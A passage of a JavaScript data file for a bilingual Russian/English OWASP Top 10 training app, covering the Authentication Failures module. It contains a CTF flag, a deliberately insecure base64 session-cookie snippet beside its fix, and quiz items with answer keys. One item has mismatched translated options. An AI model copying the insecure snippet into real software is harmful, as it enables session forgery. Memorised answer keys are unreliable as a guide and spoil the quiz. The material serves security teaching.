        q: M('Какая мера НАИБОЛЕЕ эффективна против кампаний вроде Shai-Hulud, которые эксплуатируют найденные на машине разработчика токены реестра пакетов для саморепликации?', 'Which measure is MOST effective against campaigns like Shai-Hulud that exploit registry tokens found on a developer\'s machine to self-replicate?'),
        opts: [
          M('Использование только приватных реестров без внешних зависимостей вообще', 'Using only private registries with zero external dependencies'),
          M('Короткоживущие/scoped токены публикации + MFA на публикацию + отсутствие долгоживущих токенов на локальных машинах разработчиков', 'Short-lived/scoped publish tokens + MFA for publishing + no long-lived tokens stored on developer machines'),
          M('Использование более длинных паролей для GitHub', 'Using longer GitHub passwords'),
          M('Отключение npm полностью', 'Disabling npm entirely'),
        ],
        ans: 1,
        e: M('Против кражи publish-токенов наиболее эффективны короткоживущие/scoped токены, MFA на публикацию и запрет долгоживущих токенов на локальных машинах разработчиков.', 'Against stolen publish tokens, the most effective controls are short-lived/scoped tokens, MFA for publishing, and no long-lived tokens on developer machines.'),
      },
    ],
  },
  {
    code: 'A07', name: 'Authentication Failures', nameRu: 'Сбои аутентификации',
    risk: 'HIGH', owasp2021: 'A07', owasp2025: 'A07',
    cwe: ['CWE-287', 'CWE-384', 'CWE-521', 'CWE-307'],
    flag: 'FLAG{session_fix_admin_cookie}',
    blurb: M('Подстановка учётных данных, слабые сессии, отсутствие MFA и предсказуемые файлы cookie.', 'Credential stuffing, weak sessions, no MFA, predictable cookies.'),
    theory: M(
`<p><strong>Identification & Authentication Failures</strong> — слабые пароли, нет MFA, predictable sessions, broken recovery.</p>
<div class="ebox">Cookie: session=dXNlcl9pZD0xMjM=  // base64 user_id=123
// vs
Cookie: session=a3f9b2c1…         // 32+ random + HMAC</div>
<p><strong>CVE-2020-1472 ZeroLogon</strong>, <strong>CVE-2022-40684 FortiGate auth bypass</strong>.</p>`,
`<p><strong>Identification & Authentication Failures</strong> — weak passwords, no MFA, predictable sessions, broken recovery.</p>
<div class="ebox">Cookie: session=dXNlcl9pZD0xMjM=  // base64 user_id=123
// vs
Cookie: session=a3f9b2c1…         // 32+ random + HMAC</div>
<p><strong>CVE-2020-1472 ZeroLogon</strong>, <strong>CVE-2022-40684 FortiGate auth bypass</strong>.</p>`
    ),
    vulnCode: `// Predictable session
res.cookie('session', Buffer.from('user_id='+id).toString('base64'));`,
    fixCode: `const sid = crypto.randomBytes(32).toString('hex');
sessions.set(sid, { userId: id, exp: Date.now()+3600e3 });
res.cookie('session', sid, { httpOnly: true, secure: true, sameSite: 'lax' });`,
    quiz: [
      {
        q: M('Как называлась категория A07 в редакции 2021 года?', 'What was category A07 called in the 2021 edition?'),
        opts: [
          M('Identification and Authentication Failures', 'Identification and Authentication Failures'),
          M('Broken Authentication', 'Broken Authentication'),
          M('Security Misconfiguration', 'Security Misconfiguration'),
          M('Sensitive Data Exposure', 'Sensitive Data Exposure'),
        ],
        ans: 0,
        e: M('В OWASP Top 10:2021 категория A07 называлась Identification and Authentication Failures; в 2025 её переименовали в Authentication Failures, сохранив тот же ранг.', 'In OWASP Top 10:2021 category A07 was named Identification and Authentication Failures; in 2025 it was renamed Authentication Failures while keeping the same rank.'),
      },
      {
        q: M('Сколько CWE входит в категорию A07:2025?', 'How many CWEs are in category A07:2025?'),
        opts: [
          M('24', '24'),
          M('36', '36'),
          M('40', '40'),
          M('16', '16'),
        ],
        ans: 1,
        e: M('В редакции 2025 категория A07: Authentication Failures объединяет 36 CWE, связанных со слабым подтверждением личности, брутфорсом и управлением сессиями.', 'In the 2025 edition, A07: Authentication Failures maps to 36 CWEs covering weak identity proofing, brute force, and session management.'),
      },
      {
        q: M('Почему индустрия «стала лучше» по этой категории (ранг не изменился, но улучшились практики)?', 'Why has the industry "improved" on this category (rank unchanged, but practices improved)?'),
        opts: [
          M('Все сайты перешли на биометрию', 'Every site switched to biometrics'),
          M('Аутентификация больше не требуется', 'Authentication is no longer required'),
          M('Широкое распространение стандартизированных фреймворков (OAuth2/OIDC) и готовых Identity Provider\'ов вместо самописной аутентификации', 'Widespread adoption of standardized frameworks (OAuth2/OIDC) and off-the-shelf Identity Providers instead of homegrown authentication'),
          M('Пароли стали не нужны', 'Passwords are no longer needed'),
        ],
        ans: 2,
        e: M('Ранг A07 не изменился, но практики улучшились за счёт массового внедрения OAuth2/OIDC и готовых Identity Provider вместо самописной аутентификации.', 'A07’s rank stayed the same, but industry practice improved through widespread OAuth2/OIDC and managed Identity Providers instead of custom authentication.'),
      },
      {
        q: M('Credential stuffing — это атака, при которой:', 'Credential stuffing is an attack where:'),
        opts: [
          M('атакующий перехватывает трафик', 'an attacker intercepts traffic'),
          M('атакующий эксплуатирует SQL-инъекцию', 'an attacker exploits SQL injection'),
          M('атакующий подбирает пароль перебором символов', 'an attacker brute-forces a password by trying characters'),
          M('атакующий использует списки логин/пароль пар, утёкшие с других сервисов, предполагая повторное использование паролей жертвами', 'an attacker uses login/password pairs leaked from other services, betting on password reuse by victims'),
        ],
        ans: 3,
        e: M('Credential stuffing — это автоматический вход по спискам утёкших пар логин/пароль с других сервисов, рассчитанный на повторное использование паролей, а не перебор символов одного аккаунта.', 'Credential stuffing tries leaked username/password pairs from other breaches, exploiting password reuse, rather than brute-forcing characters against one account.'),
      },
      {
        q: M('User enumeration через различие в сообщении об ошибке («пользователь не найден» vs «неверный пароль») — это:', 'User enumeration via a difference in error messages ("user not found" vs. "incorrect password") is:'),
        opts: [
          M('уязвимость, позволяющая атакующему определить существующие в системе логины/email для последующей целевой атаки', 'a vulnerability letting an attacker determine which logins/emails exist in the system for a subsequent targeted attack'),
          M('относится только к SSRF', 'relevant only to SSRF'),
          M('не является уязвимостью', 'not a vulnerability'),
          M('относится только к XSS', 'relevant only to XSS'),
        ],
        ans: 0,
        e: M('Разные сообщения «пользователь не найден» и «неверный пароль» позволяют перечислять существующие логины/email и готовить целевые атаки (stuffing, фишинг).', 'Different “user not found” vs “wrong password” messages let attackers enumerate valid logins/emails for targeted stuffing or phishing.'),
      },
      {
        q: M('Session fixation — это атака, при которой:', 'Session fixation is an attack where:'),
        opts: [
          M('сессия шифруется слабым алгоритмом', 'the session is encrypted with a weak algorithm'),
          M('атакующий устанавливает известный ему session ID жертве до её аутентификации, а сервер не меняет ID после успешного логина, позволяя атакующему переиспользовать тот же ID', 'the attacker sets a known session ID for the victim before authentication, and the server doesn\'t change the ID after successful login, letting the attacker reuse that same ID'),
          M('сессия хранится в cookie без HttpOnly', 'the session is stored in a cookie without HttpOnly'),
          M('сессия никогда не истекает', 'a session never expires'),
        ],
        ans: 1,
        e: M('При session fixation атакующий навязывает жертве известный session ID до логина; если сервер не ротирует ID после аутентификации, тот же ID даёт доступ к сессии жертвы.', 'In session fixation the attacker forces a known session ID on the victim before login; if the server does not regenerate it after authentication, that ID becomes the victim’s session.'),
      },
      {
        q: M('Почему session ID должен ротироваться (генерироваться заново) после успешного логина?', 'Why should the session ID be rotated (regenerated) after a successful login?'),
        opts: [
          M('Требуется только раз в год', 'Only required once a year'),
          M('Для экономии памяти сервера', 'To save server memory'),
          M('Чтобы предотвратить session fixation — session ID, известный атакующему до аутентификации, становится бесполезным', 'To prevent session fixation — a session ID known to the attacker before authentication becomes useless'),
          M('Не требуется, если используется HTTPS', 'Not required if HTTPS is used'),
        ],
        ans: 2,
        e: M('Ротация session ID после успешного логина делает заранее известный атакующему идентификатор бесполезным и тем самым блокирует session fixation.', 'Regenerating the session ID after login invalidates any pre-authentication ID the attacker knew, which prevents session fixation.'),
      },
      {
        q: M('NIST 800-63b рекомендует для политики паролей:', 'NIST 800-63b recommends for password policy:'),
        opts: [
          M('отсутствие ограничений вообще', 'no restrictions at all'),
          M('обязательную сложность (спецсимволы, цифры, заглавные буквы) и смену каждые 90 дней', 'mandatory complexity (special characters, digits, uppercase) and a 90-day forced change'),
          M('минимум 4 символа', 'a 4-character minimum'),
          M('приоритет длины над навязанной сложностью, проверку по спискам скомпрометированных паролей, отказ от периодической принудительной смены без причины', 'prioritizing length over imposed complexity, checking against compromised-password lists, and dropping periodic forced changes without cause'),
        ],
        ans: 3,
        e: M('NIST 800-63B рекомендует длину пароля, проверку по спискам скомпрометированных паролей и отказ от принудительной периодической смены без признаков компрометации, а не жёсткую «сложность + 90 дней».', 'NIST 800-63B prioritizes password length, breach-list checks, and no forced periodic rotation without cause—not rigid complexity rules and 90-day changes.'),
      },
      {
        q: M('Rate limiting и lockout на эндпоинте логина защищают от:', 'Rate limiting and lockout on the login endpoint protect against:'),
        opts: [
          M('брутфорс и credential stuffing атак', 'brute-force and credential-stuffing attacks'),
          M('SQL Injection', 'SQL Injection'),
          M('XSS', 'XSS'),
          M('SSRF', 'SSRF'),
        ],
        ans: 0,
        e: M('Rate limiting и lockout на login ограничивают число попыток и тем самым замедляют или блокируют брутфорс и credential stuffing.', 'Login rate limiting and lockout cap attempt volume, which slows or stops brute-force and credential-stuffing attacks.'),
      },
      {
        q: M('Почему сообщение об ошибке при неудачном логине не должно раскрывать, что именно неверно (логин или пароль)?', 'Why shouldn\'t a failed-login error message reveal specifically what was wrong (username or password)?'),
        opts: [
          M('Мешает пользователям восстановить доступ', 'It prevents users from recovering access'),
          M('Раскрытие снижает энтропию для атакующего при user enumeration и credential stuffing атаках', 'Revealing it lowers the entropy available to an attacker for user enumeration and credential-stuffing attacks'),
          M('Это не имеет значения', 'It doesn\'t matter'),
          M('Требуется только для мобильных приложений', 'Only required for mobile apps'),
        ],
        ans: 1,
        e: M('Нейтральное сообщение об ошибке не раскрывает, существует ли учётная запись, и не снижает пространство поиска для enumeration и stuffing.', 'A generic failure message avoids confirming whether an account exists and does not help attackers with user enumeration or stuffing.'),
      },
      {
        q: M('MFA (Multi-Factor Authentication) снижает риск компрометации аккаунта, потому что:', 'MFA (Multi-Factor Authentication) reduces account-compromise risk because:'),
        opts: [
          M('MFA не влияет на безопасность', 'MFA has no effect on security'),
          M('MFA работает только для администраторов', 'MFA only works for administrators'),
          M('требует дополнительный фактор (что-то, чем владеет/является пользователь), который атакующий обычно не может получить одним лишь украденным паролем', 'it requires an additional factor (something the user has/is) that an attacker usually can\'t obtain from a stolen password alone'),
          M('заменяет необходимость пароля вообще', 'it replaces the need for a password entirely'),
        ],
        ans: 2,
        e: M('MFA добавляет фактор «что есть у пользователя» или «кем он является», которого обычно нет у атакующего, укравшего только пароль.', 'MFA requires something the user has or is, which an attacker with only a stolen password typically cannot supply.'),
      },
      {
        q: M('Что из перечисленного — пример небезопасного процесса восстановления пароля?', 'Which of the following is an example of an insecure password-recovery process?'),
        opts: [
          M('Требование повторного ввода текущего пароля перед сменой', 'Requiring re-entry of the current password before changing it'),
          M('Отправка ссылки со случайным криптографически стойким токеном с ограниченным сроком действия на email пользователя', 'Emailing a link with a cryptographically strong random token that has a limited lifetime'),
          M('Уведомление пользователя о смене пароля на email', 'Notifying the user by email of a password change'),
          M('Секретный вопрос с легко угадываемым/публичным ответом (например, «любимый цвет») как единственный фактор восстановления', 'A secret question with an easily guessable/public answer (e.g., "favorite color") as the sole recovery factor'),
        ],
        ans: 3,
        e: M('Секретный вопрос с публичным или угадываемым ответом как единственный путь восстановления фактически обходит сильную аутентификацию.', 'A secret question with a public or guessable answer as the sole recovery path effectively bypasses strong authentication.'),
      },
      {
        q: M('Раскрытие session ID в URL (например, ;jsessionid=ABC123) представляет риск, потому что:', 'Exposing a session ID in the URL (e.g., ;jsessionid=ABC123) is risky because:'),
        opts: [
          M('URL часто сохраняется в истории браузера, логах сервера/прокси, Referer-заголовках — session ID может утечь этими путями', 'URLs are often saved in browser history, server/proxy logs, and Referer headers — the session ID can leak through these'),
          M('URL нельзя использовать с HTTPS', 'URLs can\'t be used with HTTPS'),
          M('Session ID в URL автоматически шифруется', 'A session ID in a URL is automatically encrypted'),
          M('URL не поддерживает длинные строки', 'URLs don\'t support long strings'),
        ],
        ans: 0,
        e: M('Session ID в URL попадает в историю браузера, логи прокси/серверов и заголовок Referer, откуда его могут украсть.', 'A session ID in the URL is stored in browser history, proxy/server logs, and Referer headers, creating leakage paths.'),
      },
      {
        q: M('PKCE (Proof Key for Code Exchange) в OAuth2 обязателен для:', 'PKCE (Proof Key for Code Exchange) in OAuth2 is mandatory for:'),
        opts: [
          M('не относится к OAuth2', 'it\'s unrelated to OAuth2'),
          M('public-клиентов (SPA, мобильные приложения), которые не могут безопасно хранить client secret', 'public clients (SPAs, mobile apps) that can\'t safely store a client secret'),
          M('confidential-клиентов с secret на сервере', 'confidential clients with a server-side secret'),
          M('только для серверных приложений', 'server-side applications only'),
        ],
        ans: 1,
        e: M('PKCE обязателен для public-клиентов (SPA, mobile), у которых нет безопасного места для client secret; он защищает authorization code flow от перехвата кода.', 'PKCE is required for public clients (SPAs, mobile) that cannot hold a client secret securely; it protects the authorization-code flow from code interception.'),
      },
      {
        q: M('Отсутствие проверки параметра state в OAuth2 authorization code flow делает приложение уязвимым к:', 'Missing verification of the state parameter in an OAuth2 authorization code flow makes the app vulnerable to:'),
        opts: [
          M('SQL Injection', 'SQL Injection'),
          M('XSS', 'XSS'),
          M('CSRF-атаке на OAuth flow (login CSRF)', 'a CSRF attack on the OAuth flow (login CSRF)'),
          M('SSRF', 'SSRF'),
        ],
        ans: 2,
        e: M('Параметр state связывает запрос авторизации с ответом и защищает OAuth flow от login CSRF; без проверки state атакующий может навязать свой код.', 'The OAuth state parameter binds the auth request to the callback and prevents login CSRF; without verifying it, an attacker can force their own code.'),
      },
      {
        q: M('Открытый (незавалидированный) redirect_uri в OAuth2-приложении может использоваться атакующим для:', 'An open (unvalidated) redirect_uri in an OAuth2 app can be used by an attacker to:'),
        opts: [
          M('Не относится к данному классу уязвимостей', 'Does not belong to this vulnerability class'),
          M('шифрования трафика', 'increase performance'),
          M('увеличения производительности', 'it can\'t be misused this way'),
          M('перехвата authorization code/token путём перенаправления на подконтрольный домен', 'intercept the authorization code/token by redirecting to an attacker-controlled domain'),
        ],
        ans: 3,
        e: M('Незавалидированный redirect_uri позволяет перенаправить authorization code или token на домен атакующего и перехватить доступ.', 'An open redirect_uri lets the attacker redirect the authorization code or token to a domain they control and steal access.'),
      },
      {
        q: M('Почему таймаут неактивной сессии важен, особенно на общих/публичных компьютерах?', 'Why does an inactivity session timeout matter, especially on shared/public computers?'),
        opts: [
          M('Снижает окно, в течение которого забытая открытой сессия может быть использована следующим пользователем устройства', 'It shrinks the window during which a session left open by mistake could be used by the next person on the device'),
          M('Экономит серверные ресурсы', 'It saves server resources'),
          M('Требуется только для банковских приложений', 'Only required for banking apps'),
          M('Не имеет значения для безопасности', 'It doesn\'t matter for security'),
        ],
        ans: 0,
        e: M('Таймаут неактивности сокращает окно, в котором оставленная на общем устройстве сессия может быть использована следующим человеком.', 'An inactivity timeout shrinks the window in which a session left open on a shared device can be abused by the next person.'),
      },
      {
        q: M('Дефолтные учётные записи (например, admin/admin), оставленные после установки, — риск, относящийся:', 'Default accounts (e.g., admin/admin) left over after installation are a risk that:'),
        opts: [
          M('исключительно к Injection', 'belongs solely to Injection'),
          M('пересекается между A02 (misconfiguration самой установки) и A07 (слабость/предсказуемость самой учётной записи как фактора аутентификации)', 'overlaps between A02 (misconfiguration of the installation itself) and A07 (the weakness/predictability of the account itself as an authentication factor)'),
          M('исключительно к A02 Misconfiguration', 'belongs solely to A02 Misconfiguration'),
          M('не является риском', 'isn\'t a risk at all'),
        ],
        ans: 1,
        e: M('Дефолтные admin/admin — и misconfiguration установки (A02), и слабый/предсказуемый фактор аутентификации (A07).', 'Default admin/admin accounts are both an installation misconfiguration (A02) and a weak, predictable authentication factor (A07).'),
      },
      {
        q: M('Что из перечисленного — правильная защита от credential stuffing помимо rate limiting?', 'Which of the following is a proper defense against credential stuffing besides rate limiting?'),
        opts: [
          M('Увеличение длины session ID', 'Increasing session ID length'),
          M('Отключение HTTPS для ускорения', 'Disabling HTTPS to speed things up'),
          M('Проверка вводимых паролей по базам известных утечек (например, Have I Been Pwned API) при регистрации/смене пароля', 'Checking submitted passwords against known-breach databases (e.g., the Have I Been Pwned API) at registration/password change'),
          M('Использование одного пароля для всех сервисных аккаунтов', 'Using one password for all service accounts'),
        ],
        ans: 2,
        e: M('Проверка паролей по базам утечек (например HIBP) при регистрации и смене не даёт закрепить уже скомпрометированные credentials, дополняя rate limiting.', 'Checking passwords against breach databases (e.g. HIBP) at registration and change blocks already-compromised credentials, complementing rate limiting.'),
      },
      {
        q: M('MFA bypass через race condition возможен, когда:', 'MFA bypass via a race condition is possible when:'),
        opts: [
          M('MFA всегда неуязвим', 'MFA is always invulnerable'),
          M('MFA использует SMS', 'MFA uses SMS'),
          M('MFA использует TOTP', 'MFA uses TOTP'),
          M('сервер не атомарно проверяет статус завершения MFA-этапа, позволяя параллельными запросами обойти проверку второго фактора', 'the server doesn\'t atomically verify that the MFA step has completed, letting parallel requests bypass the second-factor check'),
        ],
        ans: 3,
        e: M('Если статус «MFA пройден» не проверяется атомарно, параллельные запросы могут обойти второй фактор через гонку.', 'If “MFA completed” is not enforced atomically, parallel requests can race past the second-factor gate.'),
      },
      {
        q: M('Downgrade-атака на MFA — это ситуация, когда:', 'An MFA downgrade attack is a situation where:'),
        opts: [
          M('атакующий манипулирует flow аутентификации так, чтобы приложение откатилось к менее защищённому фактору (например, SMS вместо TOTP) или вообще пропустило MFA', 'an attacker manipulates the authentication flow to force it to fall back to a less-secure factor (e.g., SMS instead of TOTP) or skip MFA altogether'),
          M('не существует такой атаки', 'no such attack exists'),
          M('MFA работает медленнее обычного', 'MFA runs slower than usual'),
          M('атакующий физически крадёт устройство жертвы', 'an attacker physically steals the victim\'s device'),
        ],
        ans: 0,
        e: M('MFA downgrade — манипуляция flow так, чтобы система откатилась к слабому фактору (SMS) или пропустила MFA.', 'An MFA downgrade manipulates the auth flow so the app falls back to a weaker factor (e.g. SMS) or skips MFA entirely.'),
      },
      {
        q: M('Почему хранение session-токена в localStorage считается менее безопасным, чем в HttpOnly-cookie?', 'Why is storing a session token in localStorage considered less secure than in an HttpOnly cookie?'),
        opts: [
          M('localStorage медленнее', 'localStorage is slower'),
          M('localStorage доступен из JavaScript, поэтому уязвим к краже через XSS, тогда как HttpOnly-cookie недоступен для чтения из JS', 'localStorage is accessible from JavaScript, making it vulnerable to theft via XSS, whereas an HttpOnly cookie can\'t be read from JS'),
          M('localStorage не поддерживается современными браузерами', 'localStorage isn\'t supported by modern browsers'),
          M('Нет разницы в безопасности', 'There\'s no security difference'),
        ],
        ans: 1,
        e: M('localStorage читается из JavaScript, поэтому XSS может украсть токен; HttpOnly-cookie недоступен скриптам и устойчивее к такой краже.', 'localStorage is readable from JavaScript, so XSS can steal the token; an HttpOnly cookie cannot be read by scripts and resists that theft.'),
      },
      {
        q: M('Что из перечисленного — пример правильной архитектуры аутентификации при использовании стороннего Identity Provider (например, Auth0/Okta/Keycloak)?', 'Which of the following is a correct example of authentication architecture when using a third-party Identity Provider (e.g., Auth0/Okta/Keycloak)?'),
        opts: [
          M('Отключение MFA на стороне IdP для упрощения', 'Disabling MFA on the IdP side to simplify things'),
          M('Хранение пароля пользователя IdP в своей БД для «резерва»', 'Storing the IdP user\'s password in your own DB "as a backup"'),
          M('Делегирование хранения credential и логики MFA доверенному, специализированному IdP через стандартный протокол (OIDC/SAML)', 'Delegating credential storage and MFA logic to a trusted, specialized IdP via a standard protocol (OIDC/SAML)'),
          M('Самостоятельная реализация всей логики хранения паролей вместо делегирования IdP', 'Building the entire password-storage logic yourself instead of delegating to the IdP'),
        ],
        ans: 2,
        e: M('Правильная архитектура делегирует хранение credentials и MFA специализированному IdP по OIDC/SAML, а не дублирует пароли у себя.', 'Sound design delegates credential storage and MFA to a specialized IdP via OIDC/SAML instead of reimplementing password handling in-app.'),
      },
      {
        q: M('Атака password spraying отличается от классического брутфорса тем, что:', 'How does a password-spraying attack differ from classic brute-forcing?'),
        opts: [
          M('password spraying работает только для SSH', 'Password spraying only works against SSH'),
          M('не существует такой техники', 'No such technique exists'),
          M('это одно и то же', 'They\'re the same thing'),
          M('atакующий пробует один/несколько распространённых паролей против множества разных аккаунтов (а не много паролей против одного аккаунта), чтобы избежать lockout по одному аккаунту', 'The attacker tries one/a few common passwords against many different accounts (rather than many passwords against one account), to avoid triggering per-account lockout'),
        ],
        ans: 3,
        e: M('Password spraying пробует мало распространённых паролей против многих аккаунтов, чтобы не срабатывал per-account lockout, в отличие от брутфорса одного пользователя.', 'Password spraying tries few common passwords across many accounts to avoid per-account lockout, unlike brute-forcing one user with many passwords.'),
      },
      {
        q: M('Почему прогрессивная задержка (progressive delay) при неудачных попытках логина эффективнее жёсткого lockout аккаунта после N попыток?', 'Why is a progressive delay on failed login attempts more effective than a hard lockout after N attempts?'),
        opts: [
          M('Жёсткий lockout может использоваться атакующим для DoS-атаки на легитимного пользователя (namely account lockout DoS), тогда как прогрессивная задержка замедляет брутфорс без полной блокировки доступа легитимного владельца', 'A hard lockout can be weaponized by an attacker for a DoS attack against a legitimate user (account lockout DoS), whereas a progressive delay slows brute-forcing without fully blocking the legitimate owner\'s access'),
          M('Это одно и то же по эффекту', 'They have the same effect'),
          M('Lockout всегда лучше', 'A lockout is always better'),
          M('Задержка не влияет на брутфорс', 'A delay doesn\'t affect brute-forcing'),
        ],
        ans: 0,
        e: M('Жёсткий lockout можно обратить в DoS против владельца аккаунта; прогрессивная задержка замедляет брутфорс, не полностью блокируя легитимного пользователя.', 'Hard lockout can be weaponized as account-lockout DoS; progressive delay slows brute force without fully locking out the legitimate owner.'),
      },
      {
        q: M('Что из перечисленного относится к «Identification Failures» (часть переименованной в 2025 категории)?', 'Which of the following relates to "Identification Failures" (part of the renamed 2025 category)?'),
        opts: [
          M('XSS', 'XSS'),
          M('Некорректная/предсказуемая генерация уникальных идентификаторов пользователя, позволяющая путаницу/подмену личности в системе', 'Incorrect/predictable generation of unique user identifiers, allowing confusion/impersonation within the system'),
          M('Слабое хранение пароля (это A04)', 'Weak password storage (that\'s A04)'),
          M('SQL-инъекция', 'SQL injection'),
        ],
        ans: 1,
        e: M('Identification Failures включают некорректную или предсказуемую генерацию идентификаторов пользователя, из-за чего возможны путаница и подмена личности.', 'Identification failures include incorrect or predictable user identifiers that enable confusion or impersonation in the system.'),
      },
      {
        q: M('Верно ли, что реализация собственной (custom) системы аутентификации «с нуля» без проверенных библиотек — рекомендуемая практика согласно OWASP?', 'Is building a custom authentication system "from scratch," without using proven libraries, a recommended practice per OWASP?'),
        opts: [
          M('Да, всегда лучше', 'Yes, always better'),
          M('Да, если команда опытная', 'Yes, if the team is experienced'),
          M('Нет — OWASP рекомендует использовать проверенные, готовые фреймворки/библиотеки/IdP вместо самописной реализации из-за высокого риска тонких ошибок', 'No — OWASP recommends using proven, off-the-shelf frameworks/libraries/IdPs instead of homegrown implementations, due to the high risk of subtle bugs'),
          M('Требование не зависит от контекста', 'The recommendation doesn\'t depend on context'),
        ],
        ans: 2,
        e: M('OWASP не рекомендует писать аутентификацию с нуля: тонкие ошибки в session/MFA/reset слишком вероятны; лучше проверенные фреймворки и IdP.', 'OWASP advises against custom auth from scratch because subtle session/MFA/reset bugs are likely; prefer proven frameworks and IdPs.'),
      },
      {
        q: M('Атака Pass-the-Cookie/Pass-the-Token отличается от кражи пароля тем, что:', 'How does a Pass-the-Cookie/Pass-the-Token attack differ from stealing a password?'),
        opts: [
          M('невозможна технически', 'It\'s technically impossible'),
          M('требует физического доступа', 'It requires physical access'),
          M('относится только к мобильным приложениям', 'It only applies to mobile apps'),
          M('атакующий крадёт уже валидный session-токен/cookie напрямую (например, через malware/XSS), минуя необходимость знать сам пароль или проходить MFA заново', 'The attacker steals an already-valid session token/cookie directly (e.g., via malware/XSS), bypassing the need to know the password or re-pass MFA'),
        ],
        ans: 3,
        e: M('Pass-the-Cookie/Token крадёт уже выданный валидный session-токен (XSS, malware) и обходит повторный ввод пароля и MFA.', 'Pass-the-Cookie/Token steals an already-issued valid session token (e.g. via XSS or malware) and skips password and MFA re-entry.'),
      },
      {
        q: M('Что из перечисленного — правильная реакция системы на подозрительный логин (например, из нового региона/устройства)?', 'Which of the following is the correct system response to a suspicious login (e.g., from a new region/device)?'),
        opts: [
          M('Дополнительная верификация (step-up authentication), уведомление пользователя, возможно временная блокировка для расследования', 'Additional verification (step-up authentication), notifying the user, possibly a temporary hold pending investigation'),
          M('Ничего не делать', 'Do nothing'),
          M('Немедленно заблокировать аккаунт навсегда без уведомления', 'Immediately and permanently block the account with no notification'),
          M('Игнорировать геолокацию полностью', 'Ignore geolocation entirely'),
        ],
        ans: 0,
        e: M('При подозрительном логине уместны step-up authentication, уведомление пользователя и при необходимости временная блокировка, а не молчание или вечный бан без связи.', 'Suspicious logins warrant step-up authentication, user notification, and possibly a temporary hold—not silence or a permanent ban without notice.'),
      },
      {
        q: M('TOTP (Time-based One-Time Password) как фактор MFA более устойчив к фишингу, чем SMS-код, потому что:', 'Why is TOTP (Time-based One-Time Password) more phishing-resistant as an MFA factor than an SMS code?'),
        opts: [
          M('TOTP всегда состоит из большего числа цифр', 'TOTP always uses more digits'),
          M('TOTP генерируется локально на устройстве и не передаётся по перехватываемому SMS-каналу, уязвимому к SIM-swap', 'TOTP is generated locally on the device and isn\'t transmitted over an interceptable SMS channel vulnerable to SIM-swapping'),
          M('Нет разницы в устойчивости', 'There\'s no resilience difference'),
          M('TOTP работает без интернета', 'TOTP works without internet access'),
        ],
        ans: 1,
        e: M('TOTP генерируется локально на устройстве и не ходит по SMS, поэтому его нельзя перехватить SIM-swap’ом так же, как SMS-код.', 'TOTP is generated locally on the device and never rides SMS, so it is not exposed to SIM-swap interception the way SMS codes are.'),
      },
      {
        q: M('SIM-swapping атака направлена на компрометацию:', 'A SIM-swapping attack targets the compromise of:'),
        opts: [
          M('биометрии', 'biometrics'),
          M('TOTP-приложений', 'TOTP apps'),
          M('SMS-based MFA — атакующий переносит номер телефона жертвы на свою SIM-карту через оператора связи', 'SMS-based MFA — the attacker ports the victim\'s phone number to their own SIM card via the carrier'),
          M('паролей напрямую', 'passwords directly'),
        ],
        ans: 2,
        e: M('SIM-swapping переносит номер жертвы на SIM атакующего у оператора и компрометирует SMS-based MFA, а не TOTP-приложения напрямую.', 'SIM-swapping ports the victim’s number to the attacker’s SIM via the carrier and compromises SMS-based MFA, not TOTP apps directly.'),
      },
      {
        q: M('Что из перечисленного — best practice относительно повторного использования старых паролей при смене?', 'Which of the following is best practice regarding reusing old passwords at change time?'),
        opts: [
          M('Требовать смены пароля каждый день', 'Require a password change every day'),
          M('Не имеет значения', 'It doesn\'t matter'),
          M('Разрешить повторное использование без ограничений', 'Allow reuse without restriction'),
          M('Проверять историю паролей и предотвращать переиспользование недавно скомпрометированных/предыдущих паролей', 'Check password history and prevent reuse of recently compromised/previous passwords'),
        ],
        ans: 3,
        e: M('История паролей и запрет на недавние/скомпрометированные пароли не дают вернуть уже известный атакующему credential.', 'Password history and blocking recent or breached passwords stop users from returning to credentials attackers may already know.'),
      },
      {
        q: M('WebAuthn/FIDO2 как метод аутентификации считается более устойчивым к фишингу, чем пароль+SMS, потому что:', 'Why is WebAuthn/FIDO2 as an authentication method considered more phishing-resistant than a password+SMS combo?'),
        opts: [
          M('криптографическая привязка ключа к конкретному домену делает невозможным использование учётных данных на поддельном фишинговом сайте', 'The cryptographic binding of the key to a specific domain makes it impossible to use the credential on a fake phishing site'),
          M('он медленнее', 'It\'s slower'),
          M('он идентичен паролю по механизму', 'It\'s mechanically identical to a password'),
          M('он не требует устройства', 'It doesn\'t require a device'),
        ],
        ans: 0,
        e: M('WebAuthn/FIDO2 привязывает ключ к origin домена, поэтому учётные данные нельзя использовать на фишинговом сайте с другим origin.', 'WebAuthn/FIDO2 cryptographically binds the credential to the site’s origin, so it cannot be replayed on a phishing domain.'),
      },
      {
        q: M('Почему «step-up authentication» (дополнительная проверка для чувствительных действий, даже в рамках уже аутентифицированной сессии) — хорошая практика?', 'Why is "step-up authentication" (additional verification for sensitive actions, even within an already-authenticated session) good practice?'),
        opts: [
          M('Замедляет пользователя без пользы', 'It slows the user down with no benefit'),
          M('Даже если сессия скомпрометирована, дополнительный барьер для критичных операций (смена пароля, перевод крупной суммы) снижает impact компрометации', 'Even if the session is compromised, an extra barrier for critical operations (password change, large transfer) reduces the impact of that compromise'),
          M('Не относится к A07', 'It\'s unrelated to A07'),
          M('Требуется только для администраторов', 'Only required for administrators'),
        ],
        ans: 1,
        e: M('Step-up authentication заново подтверждает личность для критичных действий; даже при угоне сессии смена пароля или крупный перевод требуют дополнительного фактора.', 'Step-up re-verifies identity for sensitive actions so a stolen session alone is not enough for password change or large transfers.'),
      },
      {
        q: M('Атака «broken logout» возникает, когда:', 'A "broken logout" attack occurs when:'),
        opts: [
          M('логаут работает слишком быстро', 'logout runs too fast'),
          M('не является уязвимостью', 'it isn\'t a vulnerability'),
          M('клиентская сторона удаляет токен локально, но серверная сессия/токен остаётся валидным (не инвалидируется), позволяя переиспользовать перехваченный ранее токен даже после «выхода»', 'the client side removes the token locally, but the server-side session/token remains valid (isn\'t invalidated), letting a previously intercepted token be reused even after "logging out"'),
          M('логика логаута отсутствует полностью', 'logout logic is entirely absent'),
        ],
        ans: 2,
        e: M('Broken logout — когда клиент стирает токен локально, а сервер не инвалидирует сессию, и перехваченный токен продолжает работать.', 'Broken logout is when the client drops the token locally but the server never invalidates the session, so a stolen token still works.'),
      },
      {
        q: M('Что из перечисленного — правильный тест на энтропию токена сброса пароля на пентесте?', 'What\'s the correct entropy test for a password-reset token during a pentest?'),
        opts: [
          M('Проверка версии TLS', 'Checking the TLS version'),
          M('Проверка длины токена визуально', 'Visually checking the token\'s length'),
          M('Проверка цвета кнопки сброса', 'Checking the color of the reset button'),
